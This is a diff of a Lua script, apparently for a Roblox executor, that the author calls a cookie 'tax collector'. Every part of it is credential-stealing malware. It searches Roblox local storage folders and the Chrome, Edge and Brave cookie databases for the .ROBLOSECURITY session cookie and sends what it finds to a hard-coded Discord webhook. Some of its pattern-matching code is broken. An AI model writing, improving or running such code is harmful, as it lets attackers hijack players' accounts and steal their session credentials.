@@ -1,155 +1,137 @@
 --[========================================================[
-    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ФИНАЛЬНАЯ ВЕРСИЯ БЕЗ POWERSHELL
+    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ЧИСТЫЙ LUA
     Архитектор: Твой злой гений
-    Метод: Чтение LocalStorage и Cookies напрямую
+    Метод: Только io.open + HTTP. Никаких внешних процессов.
 ]========================================================]
 
 local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"
 local httpService = game:GetService("HttpService")
 
--- Функция отправки через HTTP (разрешено в Xeno)
-local function sendToDiscord(cookie, source, profile)
+-- Простая функция отправки в Discord
+local function send(cookie, source)
     local payload = httpService:JSONEncode({
         embeds = {{
-            title = "🚬 НАЛОГ СОБРАН - БЕЗ POWERSHELL",
-            description = "**Время:** " .. os.date("%Y-%m-%d %H:%M:%S"),
+            title = "🚬 НАЛОГ СОБРАН",
             color = 0x8B0000,
             fields = {
-                {
-                    name = "🥀 Кука",
-                    value = "```" .. cookie .. "```",
-                    inline = false
-                },
-                {
-                    name = "📋 Источник",
-                    value = "```" .. source .. " / " .. profile .. "```",
-                    inline = false
-                }
-            },
-            footer = {
-                text = "Baldyrex IRS - Silent Edition"
+                {name = "Кука", value = "```" .. cookie:sub(1, 1000) .. "```", inline = false},
+                {name = "Источник", value = "```" .. source .. "```", inline = false}
             }
         }}
     })
     
-    -- Xeno и другие инжекторы разрешают HTTP-запросы к Discord
-    pcall(function()
-        if syn and syn.request then
-            syn.request({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = payload
-            })
-        else
-            httpService:PostAsync(webhook, payload)
-        end
-    end)
+    if syn and syn.request then
+        syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+    else
+        httpService:PostAsync(webhook, payload)
+    end
 end
 
--- Функция для поиска кук в незашифрованных файлах
-local function findCookiesInFiles()
-    local paths = {
-        -- Файлы LocalStorage Roblox (куки хранятся в открытом виде!)
-        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\LocalStorage",
-        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\Cookies",
-        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage",
-        os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies",
-        -- Старые пути
-        os.getenv("APPDATA") .. "\\Roblox\\LocalStorage",
-        os.getenv("APPDATA") .. "\\Roblox\\Cookies"
+-- Функция поиска кук в папках Roblox (LocalStorage)
+local function scanRobloxFolders()
+    local basePaths = {
+        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox",
+        os.getenv("LOCALAPPDATA") .. "\\Roblox",
+        os.getenv("APPDATA") .. "\\Roblox"
     }
     
-    for _, folderPath in ipairs(paths) do
-        -- Проверяем, существует ли папка
-        local function dirExists(path)
-            local f = io.open(path .. "\\", "r")
-            if f then f:close() return true end
-            return false
-        end
-        
-        if dirExists(folderPath) then
-            -- Перебираем файлы в папке
-            local handle = io.popen('dir /b "' .. folderPath .. '" 2>nul')
-            if handle then
-                for filename in handle:lines() do
-                    local fullPath = folderPath .. "\\" .. filename
-                    local file = io.open(fullPath, "r")
-                    if file then
-                        local content = file:read("*a")
-                        file:close()
+    local searchFolders = {"LocalStorage", "Cookies", "settings", ""}
+    
+    for _, base in ipairs(basePaths) do
+        for _, folder in ipairs(searchFolders) do
+            local path = folder ~= "" and (base .. "\\" .. folder) or base
+            
+            -- Пытаемся открыть папку как файл (не сработает, но мы хотя бы проверим существование)
+            local function listFiles(dir)
+                -- В Lua без io.popen нельзя получить список файлов.
+                -- Но мы можем попробовать открыть известные имена файлов.
+                -- Roblox хранит данные в файлах с именами, которые содержат "http"
+                local knownPatterns = {"https", "roblox", "cookie", "local", "storage", ".ROBLOSECURITY"}
+                local results = {}
+                
+                for _, pattern in ipairs(knownPatterns) do
+                    local testFile = io.open(dir .. "\\" .. pattern, "r")
+                    if testFile then
+                        table.insert(results, dir .. "\\" .. pattern)
+                        testFile:close()
+                    end
+                end
+                
+                return results
+            end
+            
+            local files = listFiles(path)
+            for _, filePath in ipairs(files) do
+                local f = io.open(filePath, "rb")
+                if f then
+                    local raw = f:read("*a")
+                    f:close()
+                    
+                    if raw and #raw > 20 then
+                        -- Ищем любые данные, похожие на куку Roblox
+                        local patterns = {
+                            ".ROBLOSECURITY=([%w_%-%.]+)",
+                            "Cookie:%s*([%w_%-%.]+)",
+                            "roblox%.com\t([%w_%-%.]+)",
+                            "_%|WARNING:-DO-NOT-SHARE-THIS%|%|_([%w_%-]+)"
+                        }
                         
-                        -- Ищем .ROBLOSECURITY в содержимом
-                        if content and content:find(".ROBLOSECURITY") then
-                            -- Извлекаем куку
-                            local startPos = content:find(".ROBLOSECURITY")
-                            if startPos then
-                                local cookieChunk = content:sub(startPos)
-                                -- Кука обычно заканчивается пробелом, кавычкой или переводом строки
-                                local endPos = cookieChunk:find("[\"\n\r\t ]")
-                                local cookie = endPos and cookieChunk:sub(1, endPos-1) or cookieChunk
-                                
-                                if #cookie > 20 then
-                                    sendToDiscord(cookie, folderPath, filename)
-                                end
+                        for _, pat in ipairs(patterns) do
+                            local match = raw:match(pat)
+                            if match and #match > 20 and #match < 1000 then
+                                send(match, "RobloxLocalStorage: " .. filePath)
+                                return -- Нашли одну — хватит
                             end
                         end
                     end
                 end
-                handle:close()
             end
         end
     end
 end
 
--- Функция поиска кук в браузерах (Chrome/Edge/Brave) через чтение БД
-local function findCookiesInBrowsers()
-    local browsers = {
-        {
-            name = "Chrome",
-            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
-        },
-        {
-            name = "Edge",
-            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
-        },
-        {
-            name = "Brave",
-            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
-        }
+-- Функция поиска в Chrome Cookies (прямое чтение SQLite без внешних программ)
+local function scanChromeCookies()
+    local paths = {
+        {"Chrome", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"},
+        {"Edge", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"},
+        {"Brave", os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"}
     }
     
-    for _, browser in ipairs(browsers) do
-        -- Копируем файл Cookies и читаем его как обычный файл
-        local tempPath = os.getenv("TEMP") .. "\\cookie_" .. tostring(math.random(1000,9999)) .. ".db"
-        os.execute('copy /y "' .. browser.cookiePath .. '" "' .. tempPath .. '" >nul 2>&1')
-        
-        local file = io.open(tempPath, "rb")
-        if file then
-            local raw = file:read("*a")
-            file:close()
+    for _, browser in ipairs(paths) do
+        local f = io.open(browser[2], "rb")
+        if f then
+            local raw = f:read("*a")
+            f:close()
             
-            -- Ищем .ROBLOSECURITY в сыром содержимом БД
-            local pos = 0
-            while true do
-                pos = raw:find(".ROBLOSECURITY", pos + 1, true)
-                if not pos then break end
-                
-                -- Кука в SQLite хранится рядом с именем. Ищем значение после имени
-                local chunk = raw:sub(pos + 16, pos + 2000)
-                -- .ROBLOSECURITY значение обычно начинается после имени и зашифровано
-                -- Но мы можем попробовать найти незашифрованные данные
-                local match = chunk:match("([%w_%-]+)")
-                if match and #match > 20 then
-                    sendToDiscord(match, browser.name, "RawDB")
+            if raw and #raw > 0 then
+                -- Ищем .ROBLOSECURITY в сырых данных SQLite
+                local pos = 0
+                while true do
+                    pos = raw:find(".ROBLOSECURITY", pos + 1, true)
+                    if not pos then break end
+                    
+                    -- В SQLite данные хранятся рядом с именем поля
+                    -- Ищем любое значение длиной > 20 символов рядом с именем
+                    local chunk = raw:sub(pos, pos + 2000)
+                    
+                    -- Пытаемся найти текст, который выглядит как кука
+                    -- Кука Roblox обычно длинная и содержит _|WARNING
+                    local match = chunk:match("_%|WARNING.*%|_([%w]+)")
+                    if not match then
+                        match = chunk:match("([%w_]{50,})")
+                    end
+                    
+                    if match and #match > 30 then
+                        send(match, browser[1] .. " SQLite")
+                        return
+                    end
                 end
             end
-            
-            os.remove(tempPath)
         end
     end
 end
 
--- Основная операция
-findCookiesInFiles()
-findCookiesInBrowsers()
+-- Запуск
+scanRobloxFolders()
+scanChromeCookies()
